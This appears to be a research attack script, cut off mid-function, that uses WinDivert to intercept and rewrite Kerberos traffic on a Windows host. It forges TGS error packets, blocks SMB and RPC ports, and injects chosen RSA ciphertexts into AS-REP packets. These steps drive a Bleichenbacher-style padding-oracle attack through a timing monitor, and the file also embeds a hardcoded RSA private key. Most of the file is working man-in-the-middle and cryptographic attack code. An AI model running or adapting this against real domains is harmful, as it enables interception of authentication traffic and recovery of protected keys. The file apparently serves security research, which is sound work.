

import pydivert

import time
import argparse
import os
import math
#import numpy as np
import socket
import statistics
import subprocess

#import subprocess
from binascii import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
from key_constants import *
import my_attack_sim

import shortestmsgsunder10kfrom38kdb_2 as nshortunder10
from pdb import set_trace


lala_n = 24327984937773177190236571015437827448550825401989213780295239488871134924379502662637434193049620587163292182854275087819022594219049023737135345947567798319849311248076597986258804231064499475335202941096250684314185866690485165176669271965659762522376151528818154663040608750353365013949505688004928373790040111127867293758885589381065458980738214725776577213084888345840589332910756691452145049441245638906994320418926058098970209960754252539684491936021797640612275735788877127826121333785215070326794435880657740210257764754963699646651634379087952619166816708031233651202865162513326690299974958644292336367661
lala_d = 1135531164451350367348729278670435237577505453479484946731207372880308859631611130277673851359366302640226296402814097283036912213193630523397424710523977219897447901305618402428638511723550115126575610675090877570183172348538903524351607533804617445961039527696640601709587289124173269720486715894945998373785446731221731822055209805646280598671842578484462131552737308564132848514350608951238864259080916436686660761328698163678008017437129191874942985350061620048711889520146878108204764767954819914872816921588371927456588220874957055653121943813591768974058458128001043938039980245900331502810073675745766936341
lala_e = 65537
my_n = lala_n


m0_list = [1464205917639067541984950617338164070463675780139895116193619660298777537525122475351360204492538979529905841134864058293926945088471864509524286278599818395322964981395336464963715820247908155780006425158162400075747450321226461009926339602587716337971331626772344997963359345099028786186486604130197170231981701961731376582680745104766338298085062925187690722057550559052064167761854883515921181845492766621395197409520334644205264080667474448360094906967911284737895181582025251712525729604801874424404825155279645544767410401461707402812729187877572385785519685789810188184873940185865689928393487327658074673,
]



short0 = m0_list
short1 = (1476023158563390133496817602536392112722500813322704328874956721742427015578297501631593694191023973335397869101661672434051402604874128821363169432979598287123538208608042810114339530760667765312963866106560154718176813563504335713277079154301926429916605231446467207088122485270793938510737671093103550586026724643113858543150946872087074133780186503652784541840849799411318068382606014641065056281911019702051035180089297825803825422012221332489736885862269318116236750581548421269336790991866664453616413717537659354573962876303474657157939687946711248803274176150620183194610356935499669863131151200244562197, 7356)
short2 = (1436028668449975199052258010327956035664834869279769936096294561230206399276599836449851473152426390396278975826273119346881348230774851114844712443371415455665997585631144340347573885977395233032258661804254420856639084439074240402926540646596156994464885193341726593697077255360040344865272591200977997791798389100464098226256415549619247850995779870125443458542850253053896721348175733591435090881403310800502561187006409959141760232043523955697489228032362641575714562472035479617881610596707942664121174970890915450374088387587076233079393461230816235843442403435955365093587575604287513726008010121789069491, 7209)
short3 = (1477363510129029328398856757911451192723729254694594556262426401866730047772546670869971889606749659570029932469947426545513781721218497556464152449507301480690266069911435049827895284634409772087075760331073224830414651575002741525779392411525397599982730363531235117654456826150929339815860757090132630445831366068762920402968068517552163948473998826547616560415823534369978546244192232063100472520606492979466406691264737900229930342418324423741433384305643759574102345971513819673411144868226923493328039945155773761857992516910421356887351607816753580729057406059279924562686267310060435951234516240863419755, 7267)

#under 7000
short4 = (1476013019417191013901985241137269125578120708309001574295553911103431740351796420755142547726282971812160998394837562300693701987823298100823144891370552903514697106264134885144235710158504418341824533327149321016775888474622847957833195687016461839830744844937047223329107124291562445801306152753314927447191651743248329843205444855274836711361929977036705694561507753431357607780050077341477843751196387750931397568149847268970113873014013420941680404019647274025216695611508700083843468931187821375392332713237084608549473055752498165173603948017607137161062050632741986995348090755657101131250277029216642444, 6877)
short5 = (1466488664785446830401633639105495609408113006876144338591814234268688607331853338882387088675343959980587528412466312508909345466108496469489022400171615246881984879069239894741496104535169384186642305451727923687334374082959227356802256275481948896742646986408252851229269257744206197045207262333657401516246082941357475036215927535637441001535348854627897953701955862550623512141467538422449567139601606850914420748334599994911326760405389487148312846481939299797595775970051160719277065036856513595008416732175403182326061401423168754263699455152862901631809003686490431495473928057651610060283830177006360226, 6886)


m0 =  short5[0]#nshortunder10k.msgs[25][0]

#m0 = longer10k.msgs[0][0]


#m0 = m0_list[0] 
c0 = pow(m0, lala_e, lala_n)
B = 2**2032 #for 256 bytes

B2 = 2*B
B3 = 3*B




#def create_tgs_req_error_response(tgs_rep_pkt_list):
#    pass
def create_tgs_req_error_response(tgs_rep_pkt_list):
    first_pkt = tgs_rep_pkt_list[0]
    new_raw_payload = first_pkt.raw.tobytes()[:40] + first_pkt.raw.tobytes()[40:]
    #set_trace()
    new_payload = b''.fromhex('000000547e523050a003020105a10302011ea411180f32303233303632393133313235335aa5050203038d65a603020129a90f1b0d4d4943482e4b4552422e434f4daa143012a003020101a10b30091b0748415050593624')#first_pkt.payload
    first_pkt.payload = new_payload
    first_pkt.recalculate_checksums() 
    return first_pkt


#REP_COUNT = 5#20

def filter_packets(mal):

    #with pydivert.WinDivert("tcp.SrcPort ==88 or tcp.DstPort==88") as mal:
    for pkt in mal:
        yield pkt



def pkt_generator(mal):
    def pkt_gen(pkt_list):
        for pkt in pkt_list:
            if pkt.tcp.dst_port == 135 or pkt.tcp.src_port == 135 or pkt.tcp.dst_port == 389 or pkt.tcp.src_port == 389 or pkt.tcp.dst_port == 636 or pkt.tcp.src_port == 636:# or pkt.tcp.dst_port == 445 or pkt.tcp.src_port == 445:
                continue

            yield pkt
    return pkt_gen(mal)


def wait_for_next_as_repfinack(pkt_gen, mal):
    while True:
        pkt_list = []
        cur_pkt = pkt_gen.__next__()
        pkt_payload = cur_pkt.payload
        # if len(pkt_payload) < 100:
        #     mal.send(cur_pkt)
        #     continue    

        if cur_pkt.tcp.src_port==88 and (len(cur_pkt.payload)>=100) and (5 == cur_pkt.payload[0x10])  and (0x0d == cur_pkt.payload[0x15]) and (b'Lala la' in cur_pkt.payload):
            #found tgs-rep packet
            print("found tgs rep")
            tgs_tep_list = [cur_pkt]
            tgs_tep_list.append(pkt_gen.__next__()) #pkt_list.append(cur_pkt)
            res = create_tgs_req_error_response(tgs_tep_list)
            mal.send(res, recalculate_checksum=False)
            continue


        elif cur_pkt.tcp.dst_port!=88 and cur_pkt.tcp.dst_port!=445:
            mal.send(cur_pkt)
            continue    

        elif cur_pkt.tcp.dst_port == 445:# or cur_pkt.tcp.src_port == 445:#b'\x00I\x00P\x00C\x00' in  cur_pkt.payload:# or cur_pkt.tcp.src_port ==445:
            if  len(cur_pkt.payload) <= 10:
                #print("short")
                mal.send(cur_pkt)

                continue

            elif b'\xffSMB' in cur_pkt.payload: #if b'\x03\x00' == cur_pkt.payload[70:72]:
                #print("first")
                mal.send(cur_pkt)

                continue
            elif b'\xfeSMB' in cur_pkt.payload:
                #print("not short")
                #set_trace()
                if b'\x00\x00' in cur_pkt.payload[16:18]:#cur_pkt.payload[70:72]:#set_trace()#            set_trace()
                    mal.send(cur_pkt)
                    continue
                elif b'\x01\x00' in cur_pkt.payload[16:18]:
                    print(cur_pkt.payload[16:18])
                    also = pkt_gen.__next__() #maybe this causes the exception
                    #also2 = pkt_gen.__next__()
                    continue

                else:
                    print(cur_pkt.payload[16:18])
                    continue
            else:
                print(cur_pkt.payload[16:18])
                #set_trace()
                continue#set_trace()#            set_trace()

        #pkt.tcp.flags
        #pkt.tcp.ack and pkt.tcp.fin
        elif cur_pkt.tcp.ack and cur_pkt.tcp.fin:
            print("Found AS rep packet")
            mal.send(cur_pkt)
            return True
        elif cur_pkt.tcp.dst_port==88 and (len(cur_pkt.payload)>=100) and (5 == cur_pkt.payload[0x10]) and (0x0c == cur_pkt.payload[0x15]):#and (0x0e == cur_pkt.payload[0x40]) 
            #set_trace()
            #if args.btgs:
            #    print("Found a TGS-REQ and blocked")
            #    pkt_gen.__next__()
            #    continue
            #else:
            mal.send(cur_pkt)
            mal.send(pkt_gen.__next__())
            #print("Found a TGS-REQ and blocked")
            #pkt_gen.__next__()
            #continue

        
        else:
            mal.send(cur_pkt)

        # if (5 == cur_pkt.payload[0x10]) and (0x0f == cur_pkt.payload[0x26]) and (0x0b == cur_pkt.payload[0x15]):
        #     #found as-rep packet
        #     pkt_list.append(cur_pkt)
        #     pkt_list.append(pkt_gen.__next__())
        #     pkt_list.append(pkt_gen.__next__())

        #     return pkt_list
        #     #for pkt in pkt_list:
        #     #    mal.send(pkt)
        #     #break
        # else:
        #     mal.send(cur_pkt)
        #     #continue    



def get_next_as_rep(pkt_gen, mal):
    while True:
        pkt_list = []
        cur_pkt = pkt_gen.__next__()
        pkt_payload = cur_pkt.payload
        if len(pkt_payload) < 100:
            mal.send(cur_pkt)
            continue    

        if cur_pkt.tcp.src_port!=88 and cur_pkt.tcp.dst_port!=88 and cur_pkt.tcp.dst_port!=445:# and cur_pkt.tcp.src_port!=445:
            mal.send(cur_pkt)
            continue    
        elif cur_pkt.tcp.dst_port == 445:# or cur_pkt.tcp.src_port == 445:#b'\x00I\x00P\x00C\x00' in  cur_pkt.payload:# or cur_pkt.tcp.src_port ==445:
            if  len(cur_pkt.payload) <= 10:
                #print("short")
                mal.send(cur_pkt)
                continue
            elif b'\xffSMB' in cur_pkt.payload: #if b'\x03\x00' == cur_pkt.payload[70:72]:
                #print("first")
                mal.send(cur_pkt)

                continue
            elif b'\xfeSMB' in cur_pkt.payload:
                #print("not short")
                #set_trace()
                if b'\x00\x00' in cur_pkt.payload[16:18]:#cur_pkt.payload[70:72]:#set_trace()#            set_trace()
                    mal.send(cur_pkt)
                    continue
                elif b'\x01\x00' in cur_pkt.payload[16:18]:
                    print(cur_pkt.payload[16:18])
                    #also = pkt_gen.__next__()
                    #also2 = pkt_gen.__next__()
                    continue

                else:
                    print(cur_pkt.payload[16:18])
                    continue
            else:
                print(cur_pkt.payload[16:18])
                #set_trace()
                continue#set_trace()#            set_trace()
            #if b'\x00I\x00P\x00C\x00' in  cur_pkt.payload:#0\x00h\x00i\x000\x00n\x00t\x00c\x00a\x00\\#b'\x5c\x00\x5c\x00\x57\x00\x49' in#(cur_pkt.payload[70] == 0x00) and (cur_pkt.payload[71] == 0x00):
            #print("Found negotiation request and ignoring\n")
            #if not sent then no response to get
            #also = pkt_gen.__next__()
            #mal.send(cur_pkt)
            #continue
        #elif cur_pkt.tcp.dst_port == 445 and b'\x00s\x00e\x00c\x00r\x00e\x00t\x00s' in  cur_pkt.payload:
        #        print("Found negotiation request and ignoring 2\n")
                #if not sent then no response to get
        #        also = pkt_gen.__next__()
                #mal.send(cur_pkt)
        #        continue

            #else:
            #    #check whether to keep this
                #mal.send(cur_pkt)
            #    continue
        #if cur_pkt.tcp.src_port ==445:
        #    if (cur_pkt.payload[70] == 0x00) and (cur_pkt.payload[71] == 0x00):
        #        print("Found negotiation response and \n")
        #        mal.send(cur_pkt)
        #        continue

        #    set_trace()
        elif cur_pkt.tcp.dst_port==88 and  (5 == cur_pkt.payload[0x10]) and (0x0c == cur_pkt.payload[0x15]) and (0x0e == cur_pkt.payload[0x40]): 
            if args.block_tgs:
                print("Found a TGS-REQ and blocked")
                pkt_gen.__next__()
                continue
            else:
                mal.send(cur_pkt)
                mal.send(pkt_gen.__next__())
                continue
            #tgs_req block
        elif (5 == cur_pkt.payload[0x10]) and (0x0f == cur_pkt.payload[0x26]) and (0x0b == cur_pkt.payload[0x15]):
            #found as-rep packet
            pkt_list.append(cur_pkt)
            pkt_list.append(pkt_gen.__next__())
            pkt_list.append(pkt_gen.__next__())

            return pkt_list
            #for pkt in pkt_list:
                #    mal.send(pkt)
                #break

        elif (5 == cur_pkt.payload[0x10])  and (0x0d == cur_pkt.payload[0x15]) and (b'Lala la' in cur_pkt.payload):
            #found tgs-rep packet
            print("found tgs rep")
            tgs_tep_list = [cur_pkt]
            tgs_tep_list.append(pkt_gen.__next__()) #pkt_list.append(cur_pkt)
            res = create_tgs_req_error_response(tgs_tep_list)
            mal.send(res, recalculate_checksum=False)
            continue
        else:
            mal.send(cur_pkt)
            continue
                #continue    

        #if cur_pkt.tcp.dst_port == 445:
        #    if b'mysecrets' in pkt_payload:
        #        continue
        #    elif b'\x94\x01\x06\x00' in pkt_payload and b'mysecrets' in pkt_payload:
        #        continue
        #    else:
        #        mal.send(cur_pkt)
        #if 
        
        #set_trace()



def filter_nonKRBpkts(mal):
    for pkt in mal:
        yield pkt

calls_to_oracle_s1 = 0
calls_to_oracle_positive = [171, 250]
muls_found_in_simulation = [16616, 132922, 365534, 747682, 1561824, 3140262, 6346984, 12793658, 25603930, 51257705, 102548639, 205147123, 410310860, 820721410, 1641542510, 3283201325, 6566518955, 13133087755, 26266192124, 52532450708, 105065001106, 210130018826, 420260104112, 840520224838, 1681040532751, 3362081082116, 6724162247307, 13448324511228, 26896649072301, 53793298161216, 107586596538428, 215173193143316, 430346386303246, 860692772689567, 1721385545478824, 3442771090974262, 6885542182014984, 13771084364046582, 27542168728159624, 55084337456335862, 110168674912754799, 220337349825526212, 440674699651118884, 881349399302337458, 1762698798604691530, 3525397597209449520, 7050795194418915654, 14101590388837914383, 28203180777675945071, 56406361555351989832, 112812723110703996278, 225625446221408059016, 451250892442816134646, 902501784885632368982, 1805003569771264837654, 3610007139542529691922, 7220014279085059450304, 14440028558170118917222, 28880057116340237900904, 57760114232680475818422, 115520228465360951719919, 231040456930721903456452, 462080913861443806979364, 924161827722887613991957, 1848323655445775228050374, 3696647310891550456200438, 7393294621783100912533796, 14786589243566201825167282, 29573178487132403650401024, 59146356974264807300918353, 118292713948529614601853320, 236585427897059229203773100, 473170855794118458407629275, 946341711588236916815275164, 1892683423176473833630616788, 3785366846352947667261250190, 7570733692705895334522583455, 15141467385411790669045183524, 30282934770823581338090433508, 60565869541647162676180966706, 121131739083294325352361950026, 242263478166588650704723983127, 484526956333177301409448065944, 969053912666354602818896148502, 1938107825332709205637792396694, 3876215650665418411275584893078, 7752431301330836822551169919076, 15504862602661673645102339921227, 31009725205323347290204679859068, 62019450410646694580409359784596, 124038900821293389160818719585806, 248077801642586778321637439238072, 496155603285173556643274878575834, 992311206570347113286549757168282, 1984622413140694226573099514419639, 3969244826281388453146199028955583, 7938489652562776906292398057994241, 15876979305125553812584796116005096, 31753958610251107625169592232093267, 63507917220502215250339184464286224, 127015834441004430500678368928589062, 254031668882008861001356737857277814, 508063337764017722002713475714771624, 1016126675528035444005426951429559862, 2032253351056070888010853902859169569, 4064506702112141776021707805718355752, 8129013404224283552043415611436777964, 16258026808448567104086831222873572542, 32516053616897134208173662445747211544, 65032107233794268416347324891494522778, 130064214467588536832694649782989062170, 260128428935177073665389299565978207415, 520256857870354147330778599131956514520, 1040513715740708294661557198263913045654, 2081027431481416589323114396527826157768, 4162054862962833178646228793055652415226, 8324109725925666357292457586111304946757, 16648219451851332714584915172222609910128, 33296438903702665429169830344445219886716, 66592877807405330858339660688890439873122, 133185755614810661716679321377780879862549, 266371511229621323433358642755561759841403, 532743022459242646866717285511123519699420, 1065486044918485293733434571022247039481915, 2130972089836970587466869142044494079080135, 4261944179673941174933738284088988158243345, 8523888359347882349867476568177976316503304, 17047776718695764699734953136355952633089683, 34095553437391529399469906272711905266245826, 68191106874783058798939812545423810532508266, 136382213749566117597879625090847621065066377, 272764427499132235195759250181695242130149368, 545528854998264470391518500363390484260381811, 1091057709996528940783037000726780968520863312, 2182115419993057881566074001453561937041809699, 4364230839986115763132148002907123874083636012, 8728461679972231526264296005814247748167471405, 17456923359944463052528592011628495496335042500, 34913846719888926105057184023256990992670101614, 69827693439777852210114368046513981985340302918, 139655386879555704420228736093027963970680622450, 279310773759111408840457472186055927941361294745, 558621547518222817680914944372111855882722606104, 1117243095036445635361829888744223711765445278668, 2234486190072891270723659777488447423530890573950, 4468972380145782541447319554976894847061781214360, 8937944760291565082894639109953789694123562445334, 17875889520583130165789278219907579388247124957128, 35751779041166260331578556439815158776494249930870, 71503558082332520663157112879630317552988499911585, 143007116164665041326314225759260635105976999939475, 286014232329330082652628451518521270211953999912179, 572028464658660165305256903037042540423907999890818, 1144056929317320330610513806074085080847815999798250, 2288113858634640661221027612148170161695631999646345, 4576227717269281322442055224296340323391263999309304, 9152455434538562644884110448592680646782527998685068, 18304910869077125289768220897185361293565055997469826, 36609821738154250579536441794370722587130111994956266]

sim_muls = [16616, 132922, 365534, 747682, 1561824, 3140262, 6346984, 12793658, 25603930, 51257705, 102548639, 205147123, 410310860, 820721410, 1641542510, 3283201325, 6566518955, 13133087755, 26266192124, 52532450708, 105065001106, 210130018826, 420260104112, 840520224838, 1681040532751, 3362081082116, 6724162247307, 13448324511228, 26896649072301, 53793298161216]

#calls_to_oracle_positive = []

def m0_multipliers(msg):
    global calls_to_oracle_s1
    calls_to_oracle_s1 += 1
    if calls_to_oracle_s1 in calls_to_oracle_positive:
        return True
    return False

#Replace monitor outfile 
def create_external_oracle(monitor_oracle, modifier_outfile, mal_pkt_gen, mal, withVal = False):
    #cur_file = 0
    
    def wrapped_ext_oracle(msg, error_callback):
        
        #if monitor_oracle.qcount==6000:
        #    cur_file = 1
        #elif monitor_oracle.qcount==12000:
        #    cur_file = 2
        #elif monitor_oracle.qcount==18000:
        #    cur_file = 3
        #elif monitor_oracle.qcount==24000:
        #    cur_file = 4
            
        #modifier_outfile = modifier_outfile#s[cur_file]
        return handle_single_pkt(monitor_oracle, modifier_outfile, mal_pkt_gen, mal, msg, error_callback, with_val=withVal)
    return wrapped_ext_oracle

# def m0_multipliers(msg):
#     pass


def output_test_results(modifier_outfile, padding_oracle, res):
    modifier_outfile.write("Attack run time %d\n" %(time.time()-start_time))
    modifier_outfile.write("Attack return result: %s\n" %(str(res), ))
    #modifier_outfile.write("False negatives: %d\nFalse positivies: %d\nCorrect Positives: %d\n Correct Negatives %d\nFalse positive locations: %s" %(padding_oracle_ext_with_comparison.FalseNegatives, padding_oracle_ext_with_comparison.FalsePositives,padding_oracle_ext_with_comparison.CorrectPositives, padding_oracle_ext_with_comparison.CorrectNegatives, str(padding_oracle_ext_with_comparison.FalsePositivesLocation), ))
    modifier_outfile.write("False negatives: %d\nFalse positivies: %d\nCorrect Positives: %d\n Correct Negatives %d\nFalse positive locations: %s" %(padding_oracle.FalseNegatives, padding_oracle.FalsePositives,padding_oracle.CorrectPositives, padding_oracle.CorrectNegatives, str(padding_oracle.FalsePositivesLocation), ))

    print(padding_oracle.TillNextTrue)#padding_oracle_ext_with_comparison.TillNextTrue)#modifier_outfile.write("Till next Potential True: Minimum %d, Max  %d, Mean %d\n" %( min(padding_oracle_ext_with_comparison.TillNextTrue), max(padding_oracle_ext_with_comparison.TillNextTrue), statistics.mean(padding_oracle_ext_with_comparison.TillNextTrue), ))
    print("False negatives: %d\nFalse positivies: %d\nCorrect Positives %d\nCorrect Negatives %d\n" %(padding_oracle.FalseNegatives, padding_oracle.FalsePositives, padding_oracle.CorrectPositives, padding_oracle.CorrectNegatives, ))
    #print("False negatives: %d\nFalse positivies: %d\nCorrect Positives %d\nCorrect Negatives %d\n" %(padding_oracle_ext_with_comparison.FalseNegatives, padding_oracle_ext_with_comparison.FalsePositives, padding_oracle_ext_with_comparison.CorrectPositives, padding_oracle_ext_with_comparison.CorrectNegatives, ))


def handle_single_pkt(monitor_oracle, modifier_outfile, mal_pkt_gen, mal, new_msg, error_callback, with_val=False):
    pkt_list = get_next_as_rep(mal_pkt_gen, mal)
    asrep_payload = pkt_list[0].payload+pkt_list[1].payload+pkt_list[2].payload
    modifier_outfile.write("Found as rep pkt at time %s with payload:\n" %(str(time.time()), ))
    modifier_outfile.write("Found as rep pkt at time %s \n" %(str(time.time()), ))
    
    #modifier_outfile.write(str(asrep_payload)+'\n')
    modifier_outfile.write("Original as rep pkt msg:\n")
    modifier_outfile.write(str(asrep_payload[0xe7:0x1e7])+'\n')
    modifier_outfile.write("New as rep pkt msg:"+'\n')
    

    modifier_outfile.write(str(new_msg)+'\n')
    #modifier_outfile.write(time.time())

    pkt_list[0].payload = pkt_list[0].payload[:0xe7]+long_to_bytes(new_msg)+pkt_list[0].payload[0x1e7:]
    pkt_list[0].recalculate_checksums()

    monitor_oracle.send(b'Start monitor')
    start_ack = monitor_oracle.recv(1000)
    start_ack_time = time.time()
        
    time.sleep(0.3)#0.2)
    #added now
    time.sleep(0.7)
    try:
        for pkt in pkt_list:
            mal.send(pkt, recalculate_checksum=False)
    except:
        res = error_callback()
        modifier_outfile.write("Attack Not finished\n")
        output_test_results(modifier_outfile, res[3], res[:2])#monitor_oracle, res)
        modifier_outfile.write("Exception caught and test ended early")
        #monitor_oracle.send(b'Stop monitor')
        exit()
    #wait for finack
    
    wait_for_next_as_repfinack(mal_pkt_gen,mal)
    finack_time = time.time()
    #Delay after finack
    #time.sleep(float(args.delay_time))#2)#1.2)#1)#0.5)#1)#1.5)#2)#0.7)#2)#0.3
    monitor_oracle.send(b'Stop monitor:%f' %(float(args.delay_time), ))#0.1, ))
    if args.is_verbose:
        modifier_outfile.write('Recv ack on start monitor at %f\nRecv fin ack at time %f\n' %(start_ack_time, finack_time, ))
    #adding to separate the packets
    time.sleep(float(args.delay_time))
    #time.sleep(0.1)
    oracle_res = monitor_oracle.recv(1000)
    print(oracle_res)
    modifier_outfile.write("Oracle result: %s" %(oracle_res, ))
    if oracle_res == b'Error' or oracle_res == b'':
        #add recursion limit? counts as a false if theres an issue.
        return handle_single_pkt(monitor_oracle, modifier_outfile, mal_pkt_gen, mal, new_msg)
    if with_val:
        return int(oracle_res)
    
    return (oracle_res == b'T')


def create_anylenmsg():
    msg = b'\x00\x02' +generate_random_with_a_zero(withallnozero, 229)+ b'\x00'+generate_random(withallnozero, 24)
    #enc_msg = long_to_bytes(pow(bytes_to_long(msg), lala_e, lala_n))#partial_encrypt(cipher,msg)
    enc_msg = pow(bytes_to_long(msg), lala_e, lala_n)#partial_encrypt(cipher,msg)
    return enc_msg

def create_3deslenmsg():
    msg = b'\x00\x02' +generate_random(withallnozero, 229)+ b'\x00'+generate_random(withallnozero, 24)
    #enc_msg = long_to_bytes(pow(bytes_to_long(msg), lala_e, lala_n))#partial_encrypt(cipher,msg)
    enc_msg = pow(bytes_to_long(msg), lala_e, lala_n)#partial_encrypt(cipher,msg)
    return enc_msg

def create_badpadding():
    msg = b'\x00'+generate_random(withallnotwo, 1) +generate_random(withall, 254) 
    #enc_msg = long_to_bytes(pow(bytes_to_long(msg), lala_e, lala_n))#partial_encrypt(cipher,msg)
    enc_msg = pow(bytes_to_long(msg), lala_e, lala_n)#partial_encrypt(cipher,msg)
    return enc_msg

def test_calibration(msg, padding_oracle_sim, padding_oracle_to_calibrate, s_start = 0, count = 5, rounds = 1):#25):
    s_min = my_attack_sim.myceil(lala_n, B3)
    if s_start == 0:
        s1 = s_min
    else:
        s1 = s_start
    #padding_oracle_sim = my_attack_sim.PaddingOracleAnyLength()
    #padding_oracle_to_calibrate
    cur_s = s1
    for round in range(rounds):
        print("Current round %d\n" %round)
        new_good_msg = create_anylenmsg()
        new_bad_msg = create_badpadding()
        
        #s_nonconf, iteration_count =  my_attack_sim.find_non_multiplier(padding_oracle_sim, msg, cur_s)
        #s_conf, iteration_count2a = my_attack_sim.find_multiplier(padding_oracle_sim, msg, cur_s)
        for i in range(count):
            #new_good_msg = padding_oracle_to_calibrate.multiply(msg, s_conf)
            #new_bad_msg = padding_oracle_to_calibrate.multiply(msg, s_nonconf)
            
            gconforms = padding_oracle_to_calibrate.perform_external_query(new_good_msg, None)#perform_query(new_msg)
            time.sleep(0.1)
        for i in range(count):
        
            bconforms = padding_oracle_to_calibrate.perform_external_query(new_bad_msg, None)#perform_query(new_msg)
            time.sleep(0.1)
        
        #cur_s = s_conf+1


def test_calibration2(msg, padding_oracle_sim, padding_oracle_to_calibrate, s_start = 0, count = 5, rounds = 1):#25):
    s_min = my_attack_sim.myceil(lala_n, B3)
    if s_start == 0:
        s1 = s_min
    else:
        s1 = s_start
    #padding_oracle_sim = my_attack_sim.PaddingOracleAnyLength()
    #padding_oracle_to_calibrate
    cur_s = s1
    for round in range(rounds):
        print("Current round %d\n" %round)
        new_good_msg = create_3deslenmsg()
        new_bad_msg = create_badpadding()
        
        #s_nonconf, iteration_count =  my_attack_sim.find_non_multiplier(padding_oracle_sim, msg, cur_s)
        #s_conf, iteration_count2a = my_attack_sim.find_multiplier(padding_oracle_sim, msg, cur_s)
        for i in range(count):
            #new_good_msg = padding_oracle_to_calibrate.multiply(msg, s_conf)
            #new_bad_msg = padding_oracle_to_calibrate.multiply(msg, s_nonconf)
            
            gconforms = padding_oracle_to_calibrate.perform_external_query(new_good_msg, None)#perform_query(new_msg)
            time.sleep(0.1)
        for i in range(count):
        
            bconforms = padding_oracle_to_calibrate.perform_external_query(new_bad_msg, None)#perform_query(new_msg)
            time.sleep(0.1)
        
        #cur_s = s_conf+1



start_time = 0

def get_last_msg(modifier_outfile):
    modifier_outfile.flush()
    #set_trace()
    myreader = open(modifier_outfile_name, 'r')
    mylines = myreader.readlines()
    for line_num in range(-20,-1):
        if 'Original as' in mylines[line_num]:
            
            #lines = subprocess.check_output(['tail', '-3',modifier_outfile_name])
            new_msg = mylines[line_num+1]#lines[-1]
            print(new_msg)
        #else:
            #set_trace()
    return new_msg 

def meddler(attack_values, s_start_after =0, is_calibration = False, is_second_oracle=False):#test_cnt = 20, repeat_cnt=REP_COUNT):
    #global last_update_time
    global start_time
    modifier_outfile = init_files(args)
    #modifier_outfile = modifier_outfiles[0]
    #external oracle
    padding_oracle_sim = my_attack_sim.PaddingOracleAnyLength()
    padding_oracle_sim_enc = my_attack_sim.PaddingOracleAnyLength(onCT=True)
    #padding_oracle_ext = my_attack_sim.PaddingOracleAnyLength(onCT=True, onExternal=True, externalOracleCall=m0_multipliers)
    #padding_oracle_ext = my_attack_sim.PaddingOracleAnyLength(onCT=True, onExternal=True, externalOracleCall=None)
    #if first part is simulated:
    s_min = my_attack_sim.myceil(lala_n, B3)
    #s1, iteration_count2a =  my_attack_sim.find_multiplier(padding_oracle_ext, m0, s_min)
    fromdiff, untildiff, startbyte, endbyte = attack_values
    if is_calibration or is_second_oracle:
        fromdiff, untildiff, startbyte, endbyte = (False, False, 0, 0)
    if fromdiff:
        #modifier_outfile.write("Simulating beginning of attack on ciphertext: %d \nRunning from middle: %s with values %s for A-B set and r_i val %d\nUntil nibble difference %d\n" %(c0, from_diff, str(fromdiffab), fromlastri, until_diff, ))
        modifier_outfile.write("Simulating beginning of attack on ciphertext: %d \nRunning until byte: %d\n" %(c0, startbyte, ))# str(fromdiffab), fromlastri, until_diff, ))
        #simulated_beginning_result = my_attack_sim.simulate_attack_with_message(msg=c0, padding_oracle=padding_oracle_sim_enc, from_diff=0, until_diff=(512-2*startbyte))#28)#29)
        simulated_beginning_result = my_attack_sim.simulate_attack_with_message(msg=m0, padding_oracle=padding_oracle_sim, from_diff=0, until_diff=(512-2*startbyte))#28)#29)
        if simulated_beginning_result:
            print(simulated_beginning_result)
            modifier_outfile.write("Attack simulation of beginning result: %s\n" %(simulated_beginning_result, ))

    
    
    #connect to monitor

    print("connecting to monitor")
    start_time = time.time()
    set_trace()
    monitor_oracle = socket.create_connection((args.monitor_ip, int(args.monitor_port)))
    print("Connected")
    #monitor_oracle.send(b'Beginning')
    monitor_oracle.send(b'Beginning')
    #new_msg 


    toblock = ""
    if args.block_135:
        toblock += " or tcp.SrcPort ==135 or tcp.DstPort==135 "
    if args.block_389:
        toblock += " or tcp.SrcPort ==389 or tcp.DstPort==389 "
    if args.block_636:
        toblock += " or tcp.SrcPort ==636 or tcp.DstPort==636 "
    if args.block_445:
        toblock += " or tcp.DstPort==445 " # or tcp.SrcPort ==445



    todivert = "tcp.SrcPort ==88 or tcp.DstPort==88"
    todivert += toblock
    #use on vm
    mal = pydivert.WinDivert(todivert)#"tcp.SrcPort ==88 or tcp.DstPort==88")# or tcp.SrcPort ==135 or tcp.DstPort==135")#tcp.SrcPort ==1920")# #add blocking of port 135 NETLogon
    mal.open()
    mal_pkt_gen = pkt_generator(mal)#filter_packets(mal)

    single_call_external_oracle = create_external_oracle(monitor_oracle, modifier_outfile, mal_pkt_gen, mal, withVal=args.with_val)
    

    

    #padding_oracle_ext_with_comparison =  my_attack_sim.PaddingOracleAnyLength(onCT=True, externalOracleCall=single_call_external_oracle, onExternal=True, withExternalAndComparison=True)
    #padding_oracle_ext_with_comparison =  my_attack_sim.PaddingOracleAnyLength(onCT=True, externalOracleCall=single_call_external_oracle, onExternal=True, withExternalTripleAndComparison=True)
    
    padding_oracle_ext_with_comparison =  my_attack_sim.PaddingOracleAnyLength(onCT=True, externalOracleCall=single_call_external_oracle, onExternal=True, withExternalPosComparison=True, withVal=args.with_val)

    #LAST5AB
    #LAST5RI 
    #from_diff = 
    if fromdiff:
        from_diff = True
        fromdiffab=simulated_beginning_result[:2]
        fromlastri=simulated_beginning_result[2]
        modifier_outfile.write(simulated_beginning_result[3])

    else:
        from_diff=False
        fromdiffab=my_attack_sim.LAST5AB
        fromlastri=my_attack_sim.LAST5RI
    
    if untildiff:
        until_diff = 512-2*endbyte
        if until_diff <= 3:
            until_diff = 3
    else:
        until_diff = 3
 
    #from_diff=True
    #fromdiffab=my_attack_sim.LAST5AB#my_attack_sim.LAST10AB#my_attack_sim.LAST15AB
    #fromlastri=my_attack_sim.LAST5RI #my_attack_sim.LAST15RI 
    #until_diff=3#20#28#24
    if is_calibration:
        print("Running calibration")
        test_calibration(c0, padding_oracle_sim_enc, padding_oracle_ext_with_comparison, s_min+ s_start_after, 5, 10)#400)#100, 1)#4)
        print("False negatives: %d\nFalse positivies: %d\n" %(padding_oracle_ext_with_comparison.FalseNegatives, padding_oracle_ext_with_comparison.FalsePositives, ))
    
    elif is_second_oracle:

        print("Running calibration")
        test_calibration2(c0, padding_oracle_sim_enc, padding_oracle_ext_with_comparison, s_min+ s_start_after, 5, 40)#60)#00)#400)#100, 1)#4)
        print("False negatives: %d\nFalse positivies: %d\n" %(padding_oracle_ext_with_comparison.FalseNegatives, padding_oracle_ext_with_comparison.FalsePositives, ))
    
    else:    

        #get first messages to decipher:
